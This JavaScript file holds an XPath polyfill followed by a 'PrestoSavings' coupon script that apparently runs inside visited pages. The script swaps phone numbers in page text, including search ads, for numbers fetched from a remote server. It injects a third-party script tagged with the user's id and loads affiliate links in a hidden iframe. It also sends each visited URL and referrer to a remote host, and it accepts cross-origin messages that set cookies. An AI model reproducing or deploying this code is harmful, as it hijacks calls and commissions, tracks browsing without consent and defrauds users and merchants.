function Z(a,b){if(0==b)if(a instanceof J)b=4;else if("string"==typeof a)b=2;else if("number"==typeof a)b=1;else if("boolean"==typeof a)b=3;else throw Error("Unexpected evaluation result.");if(2!=b&&1!=b&&3!=b&&!(a instanceof J))throw Error("value could not be converted to the specified type");this.resultType=b;var c;switch(b){case 2:this.stringValue=a instanceof J?Xa(a):""+a;break;case 1:this.numberValue=a instanceof J?+Xa(a):+a;break;case 3:this.booleanValue=a instanceof J?0<a.i:!!a;break;case 4:case 5:case 6:case 7:var d=
L(a);c=[];for(var e=M(d);e;e=M(d))c.push(e instanceof F?e.a:e);this.snapshotLength=a.i;this.invalidIteratorState=!1;break;case 8:case 9:d=Wa(a);this.singleNodeValue=d instanceof F?d.a:d;break;default:throw Error("Unknown XPathResult type.");}var f=0;this.iterateNext=function(){if(4!=b&&5!=b)throw Error("iterateNext called with wrong result type");return f>=c.length?null:c[f++]};this.snapshotItem=function(a){if(6!=b&&7!=b)throw Error("snapshotItem called with wrong result type");return a>=c.length||
0>a?null:c[a]}}Z.ANY_TYPE=0;Z.NUMBER_TYPE=1;Z.STRING_TYPE=2;Z.BOOLEAN_TYPE=3;Z.UNORDERED_NODE_ITERATOR_TYPE=4;Z.ORDERED_NODE_ITERATOR_TYPE=5;Z.UNORDERED_NODE_SNAPSHOT_TYPE=6;Z.ORDERED_NODE_SNAPSHOT_TYPE=7;Z.ANY_UNORDERED_NODE_TYPE=8;Z.FIRST_ORDERED_NODE_TYPE=9;function Kb(a){this.lookupNamespaceURI=Ia(a)}
function Lb(a){a=a||h;var b=a.document;b.evaluate||(a.XPathResult=Z,b.evaluate=function(a,b,e,f){return(new Jb(a,e)).evaluate(b,f)},b.createExpression=function(a,b){return new Jb(a,b)},b.createNSResolver=function(a){return new Kb(a)})}var Mb=["wgxpath","install"],$=h;Mb[0]in $||!$.execScript||$.execScript("var "+Mb[0]);for(var Nb;Mb.length&&(Nb=Mb.shift());)Mb.length||void 0===Lb?$[Nb]?$=$[Nb]:$=$[Nb]={}:$[Nb]=Lb;})()



/*
 * PrestoSavings namespace
 */
if (typeof PrestoSavingsiFrame == "undefined") {
    var PrestoSavingsiFrame = {};
}

PrestoSavingsiFrame = {
    partner_settings: {},

    rewrite_phone_numbers: function(phone_sources, phone_targets, current_node) {

        function replace_text(search, replacement, current_node) {
            var new_value = current_node.nodeValue.replace(search, replacement);

            if (new_value !== current_node.nodeValue) {
                current_node.nodeValue = new_value;
            }
        }

        // For each source phone number, look up its replacement, then
        // perform search and replace on current node.
        for (var i = 0; i < phone_sources.length; i++) {
            var source_number = phone_sources[i][0];
            var source_tag = phone_sources[i][1];
            var replacement = phone_targets[source_tag];

            // Skip entries in the source list that do not have a
            // corresponding entry in the target list.
            if (!replacement) {
                continue;
            }

            // XXX-YYY-ZZZZ
            replace_text(source_number.slice(0, 3) + '-' + source_number.slice(3, 6) + '-' + source_number.slice(6), replacement.slice(0, 3) + '-' + replacement.slice(3, 6) + '-' + replacement.slice(6), current_node);

            // XXX-YYYYYYY
            replace_text(source_number.slice(0, 3) + '-' + source_number.slice(3), replacement.slice(0, 3) + '-' + replacement.slice(3, 6) + '-' + replacement.slice(6), current_node);

            // XXX.YYY.ZZZZ
            replace_text(source_number.slice(0, 3) + '.' + source_number.slice(3, 6) + '.' + source_number.slice(6), replacement.slice(0, 3) + '.' + replacement.slice(3, 6) + '.' + replacement.slice(6), current_node);

            // (XXX) YYY ZZZZ
            replace_text('(' + source_number.slice(0, 3) + ') ' + source_number.slice(3, 6) + ' ' + source_number.slice(6), '(' + replacement.slice(0, 3) + ') ' + replacement.slice(3, 6) + ' ' + replacement.slice(6), current_node);

            // (XXX) YYY-ZZZZ
            replace_text('(' + source_number.slice(0, 3) + ') ' + source_number.slice(3, 6) + '-' + source_number.slice(6), '(' + replacement.slice(0, 3) + ') ' + replacement.slice(3, 6) + '-' + replacement.slice(6), current_node);
        }
    },

    load: function() {
        var phone_sources;
        var phone_targets;
        var timer_id;
        var count = 0;
        var adv = PrestoSavingsiFrame.partner_settings.params.adv;

        // If the phone module is active for this partner, retrieve
        // the phone lists, then attempt to perform the substitutions
        // several times. The multiple attempts are necessary for Google
        // search results since those pages pull in their ads after the
        // DOMContentLoaded event has fired.
        if (PrestoSavingsiFrame.partner_settings.phone_rewriter) {
            try {
                httpRequestPost(PrestoSavingsiFrame.partner_settings.params.src + "phone_rewrite_sources.php", null, function(response) {
                    phone_sources = JSON.parse(response);

                    httpRequestPost(PrestoSavingsiFrame.partner_settings.params.src + adv.toLowerCase() + "_phone_rewrite_targets.php", null, function(response) {
                        phone_targets = JSON.parse(response);

                        timer_id = setInterval(function() {
                            var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);

                            while (walker.nextNode()) {
                                // Skip large text nodes since they are probably scripts or stylesheets.
                                if (walker.currentNode.nodeValue.length < 100) {
                                    PrestoSavingsiFrame.rewrite_phone_numbers(phone_sources, phone_targets, walker.currentNode);
                                }
                            }

                            if (count++ >= 10) {
                                clearInterval(timer_id);
                            }
                        }, 500);
                    });
                });
            } catch (ignore) {}
        }

        if (PrestoSavingsiFrame.partner_settings.search_feed && PrestoSavingsiFrame.partner_settings.params.search_feed) {
            try {
                var __ref1 = "6c6f79616c7479636f6d6d65726365",
                    __teid = "prestosavings",
                    __tuid = PrestoSavingsiFrame.partner_settings.params.uid,
                    __tenid = PrestoSavingsiFrame.partner_settings.params.attr_text,
                    __ref2 = adv,
                    __ref3 = PrestoSavingsiFrame.partner_settings.params.brows,
                    e = document.createElement("script");

                e.type = "text/javascript";
                e.async = true;
                e.src = "//a.tfxiq.com/a.php?626ref1=" + __ref1 + "&626ref2=" + __ref2 + "&626ref3=" + __ref3 + "&626Name=" + __tenid + "&teid=" + __teid + "&tuid=" + __tuid;
                document.body.appendChild(e);
            } catch (ignore) {}
        }

        //if no coupons/prices/injection stop:
        if (!PrestoSavingsiFrame.partner_settings.coupons && !PrestoSavingsiFrame.partner_settings.price_comparison && !PrestoSavingsiFrame.partner_settings.injection)
            return false;

        var iframe = document.createElement("iframe");
        iframe.setAttribute("src", PrestoSavingsiFrame.partner_settings.params.src + 'iframe.php');
        iframe.id = "prestosavings-ifrm-01";
        iframe.name = "prestosavings-ifrm-01";
        iframe.style.width = "330px";
        iframe.style.height = "0px";
        iframe.style.border = "0px";
        iframe.style.position = "fixed";
        iframe.style.bottom = "0px";

        if (adv === 'bkbl' || adv === 'BKBL') {
            iframe.style.left = "0px";
        } else {
            iframe.style.right = "0px";
        }

        iframe.style.padding = "0px";
        iframe.style.lineHeight = "1em";
        iframe.style.zIndex = "99999999999";
        iframe.style.marginRight = "10px";
        document.getElementsByTagName("body")[0].appendChild(iframe);

        var iframe2 = document.createElement("iframe");
        iframe2.setAttribute("src", PrestoSavingsiFrame.partner_settings.params.src + "iframe2.php");
        iframe2.id = "prestosavings-ifrm-02";
        iframe2.name = "prestosavings-ifrm-02";
        iframe2.style.width = "100%";
        iframe2.style.height = "0px";
        iframe2.style.border = "0px";
        iframe2.style.position = "absolute";
        iframe2.style.top = "0px";
        iframe2.style.left = "0px";
        iframe2.style.padding = "0px";
        iframe2.style.lineHeight = "1em";
        iframe2.style.zIndex = "99999999999";
        iframe2.style.marginRight = "10px";
        document.getElementsByTagName("body")[0].appendChild(iframe2);

        var ifrm_json = {
            "message": "init",
            "pc": false,
            "cp_pop": PrestoSavingsiFrame.partner_settings.params.cppop,
            "pc_pop": PrestoSavingsiFrame.partner_settings.params.pcpop,
            "bar_pop": PrestoSavingsiFrame.partner_settings.params.barpop,
            "uid": PrestoSavingsiFrame.partner_settings.params.uid,
            "pid": PrestoSavingsiFrame.partner_settings.params.pid,
            "host": document.location.host,
            "referer": encodeURIComponent(document.location),
            "psize": window.innerHeight,
            "cookie": PrestoSavingsiFrame.readCookie('prestosavings_seen'),
            "partner_settings": PrestoSavingsiFrame.partner_settings,
            "injectConfirm": PrestoSavingsiFrame.readCookie('injectConfirm'),
            "prestoInject": PrestoSavingsiFrame.readCookie('prestoshopperInjected'),
            "injectNotification": PrestoSavingsiFrame.readCookie('injectNotification'),
            "hideBar": PrestoSavingsiFrame.readCookie('PShideBar'),
            "attr_text": PrestoSavingsiFrame.partner_settings.params.attr_text,
            "attr_link": PrestoSavingsiFrame.partner_settings.params.attr_link,
            "attr_logo": PrestoSavingsiFrame.partner_settings.params.attr_logo
        };

        if (PrestoSavingsiFrame.partner_settings.merchant !== false && ifrm_json.pc_pop === true) {
            if (typeof wgxpath !== 'undefined') {
                wgxpath.install();
            }

            ifrm_json.mercname = PrestoSavingsiFrame.partner_settings.merchant.name;
            for (var strKey in PrestoSavingsiFrame.partner_settings.merchant) {
                if (strKey != 'merchantName') {
                    var strXPathValue = PrestoSavingsiFrame.partner_settings.merchant[strKey];
                    ifrm_json[strKey] = PrestoSavingsiFrame.parseXPath(strXPathValue);
                    ifrm_json.pc = true;
                }
            }
        }

        iframe.onload = function() {
            iframe.contentWindow.postMessage(JSON.stringify(ifrm_json), "*");
        };

        iframe2.onload = function() {
            iframe2.contentWindow.postMessage(JSON.stringify(ifrm_json), "*");
        };

    },

    affiliateNet: function() {
        //exit if no injection
        if (!PrestoSavingsiFrame.partner_settings.injection)
            return false;

        if (PrestoSavingsiFrame.partner_settings.injection_suspend === true) {
            PrestoSavingsiFrame.createCookie('prestoshopperLoad', 1);
            PrestoSavingsiFrame.createCookie('PShideBar', 1);
        }

        var loaded = PrestoSavingsiFrame.readCookie('prestoshopperLoad');
        var inj_confirm = PrestoSavingsiFrame.readCookie('injectConfirm');

        if (inj_confirm != '1' && PrestoSavingsiFrame.partner_settings.injection_confirm === true)
            return false;

        if (PrestoSavingsiFrame.partner_settings.inject_in.url && !loaded) {
            if (PrestoSavingsiFrame.partner_settings.inject_in.partnerclick) {
                PrestoSavingsiFrame.createCookie('prestoshopperLoad', 1);
            } else if (PrestoSavingsiFrame.partner_settings.inject_in.active == 1 && PrestoSavingsiFrame.partner_settings.inject_in.url) {
                PrestoSavingsiFrame.createCookie('prestoshopperLoad', 1);
                PrestoSavingsiFrame.createCookie('prestoshopperInjected', 1);

                var iframe = document.createElement("iframe");
                iframe.setAttribute("src", PrestoSavingsiFrame.partner_settings.inject_in.url);
                iframe.setAttribute("width", "0");
                iframe.setAttribute("height", "0");
                iframe.setAttribute("frameborder", "0");
                iframe.id = "prestosavings-ifrm-03";
                iframe.style.display = "none";
                iframe.style.visibility = "hidden";
                document.getElementsByTagName("body")[0].appendChild(iframe);
                return true;
            }
        }
    },

    parseXPath: function(xpath) {
        if (xpath === undefined || xpath === "")
            return "";

        try {
            var result = document.evaluate("normalize-space(" + xpath + ")", document, null, XPathResult.ANY_TYPE, null);
            if (result.stringValue === undefined || result.stringValue === null || result.stringValue === "" || result.stringValue.replace(/\s/g, '') === "") return '';
            return result.stringValue;
        } catch (e) {
            return "";
        }
    },
    createCookie: function(name, value, days) {
        var date, expires = '';
        if (days) {
            date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toGMTString();
        }
        document.cookie = name + "=" + value + expires + "; path=/";
    },
    readCookie: function(cName) {
        var nameEQ = cName + "=";
        var ca = document.cookie.split(";");
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == " ") c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }
};

function addEvent(event_type, listener) {
    if (window.addEventListener) // W3C DOM
        window.addEventListener(event_type, listener, false);
    else // IE DOM
        window.attachEvent("on" + event_type, listener);
}

addEvent("message", function(e) {
    var ifrm_prsto;
    var data = {};
    data.message = null;

    if (typeof(e.data) !== 'object') {
        if (e.data.charAt(0) == '{')
            data = JSON.parse(e.data);
    } else {
        data = e.data;
    }

    if (typeof(data.message) !== 'undefined') {
        if (data.message == 'psLoadSettingsStart') {
            var params = data.data;
            params.src = "https://savecdn.com/addon/coupontool2/";

            httpRequestPost(params.src + "load_settings.php?pid=" + params.adv + "&host=" + document.location.host + "&u=" + params.uid + "-" + params.brows + "-" + params.adv, 'ref=' + encodeURIComponent(document.referrer) + "&url=" + encodeURIComponent(document.location.href) + "&subid=" + params.subid + "&last_url=" + params.last_url, function(response) {
                var partner_settings = JSON.parse(response);
                partner_settings.params = params;

                if (typeof partner_settings === "object") {
                    PrestoSavingsiFrame.partner_settings = partner_settings;
                    PrestoSavingsiFrame.affiliateNet();
                    PrestoSavingsiFrame.load();
                }
            });
        } else if (data.message == 'sizeCh') {
            ifrm_prsto = document.getElementById('prestosavings-ifrm-01');
            ifrm_prsto.style.height = data.height;
        } else if (data.message == 'sizeCh02') {
            ifrm_prsto = document.getElementById('prestosavings-ifrm-02');
            ifrm_prsto.style.height = data.height;
            var body = document.getElementsByTagName("body")[0];
            body.style.marginTop = data.height;
        } else if (data.message == 'setCo') {
            PrestoSavingsiFrame.createCookie(data.name, data.value);
        } else if (data.message == 'reload') {
            window.location.reload();
        }
    }
});

setTimeout(function() {
    var script = document.getElementById('prestosavings_script');
    var script_tags;
    var params = {};
    var query;
    var i;
    var src;

    // Parent script is using tag attributes.
    if (script) {
        console.log('Using tag attributes');
        params.brows = script.getAttribute('brows');
        params.adv   = script.getAttribute('adv');
        params.uid   = script.getAttribute('uid');
        params.cppop = script.getAttribute('cppop');
        params.pcpop = script.getAttribute('pcpop');
        params.search_feed = script.getAttribute('search_feed');
        params.subid = script.getAttribute('subid');
        params.attr_text = script.getAttribute('attr_text');
        params.attr_link = script.getAttribute('attr_link');
        params.attr_logo = script.getAttribute('attr_logo');
        params.last_url = script.getAttribute('last_url');
    } else { // Parent script is using query string parameters.
        console.log('Using query parameters');
        script_tags = document.getElementsByTagName('script');

        for (i = 0; i < script_tags.length; i++) {
            src = script_tags[i].src;

            // This magic number is part of the URL for Amazon CloudFront
            // distribution that holds the current script.
            if (src.indexOf('d3nopcd55fda0e') > -1) {
                query = parseQuery(src);
                params.brows = query.brows;
                params.adv   = query.adv;
                params.uid   = query.uid;
                params.cppop = query.cppop;
                params.pcpop = query.pcpop;
                params.search_feed = query.search_feed;
                params.subid = query.subid;
                params.attr_text = query.attr_text;
                params.attr_link = query.attr_link;
                params.attr_logo = query.attr_logo;
                params.last_url = query.last_url;
            }
        }
    }

    if (params.uid) {
        // Strip dashes if partner included them by mistake.
        params.uid = params.uid.replace(/-/g, '');
    } else {
        params.uid = 'un';
    }

    if (params.subid) {
        // Strip dashes if partner included them by mistake.
        params.subid = params.subid.replace(/-/g, '');
    }

    params.brows = params.brows || 'un';

    params.search_feed = params.search_feed || 'true';

    console.log(params);

    if (!params.adv)   { throw new Error('Missing parameter: adv'); }
    if (!params.cppop) { throw new Error('Missing parameter: cppop'); }
    if (!params.pcpop) { throw new Error('Missing parameter: pcpop'); }


    // Convert from string to boolean.
    params.cppop = JSON.parse(params.cppop);
    params.pcpop = JSON.parse(params.pcpop);
    params.search_feed = JSON.parse(params.search_feed);

    postMessage({
        message: "psLoadSettingsStart",
        data: params
    }, "*");
}, 100);

function httpRequestPost(url, data, func) {
    var request = new XMLHttpRequest();

    request.onreadystatechange = function() {
        if (request.readyState == 4 && request.status == 200) {
            func(request.responseText);
        }
    };

    request.open("POST", url, true);
    request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    request.send(data);
}

// https://stackoverflow.com/a/13419367
function parseQuery(qstr) {
    "use strict";
    var query = {},
        a = qstr.split('?')[1].split('&'),
        b = a[0].split('='),
        i = null;

    query[decodeURIComponent(b[0])] = decodeURIComponent(b[1]);

    a = qstr.split('&');

    for (i in a) {
        if (a.hasOwnProperty(i)) {
            b = a[i].split('=');
            query[decodeURIComponent(b[0])] = decodeURIComponent(b[1]);
        }
    }

    return query;
}
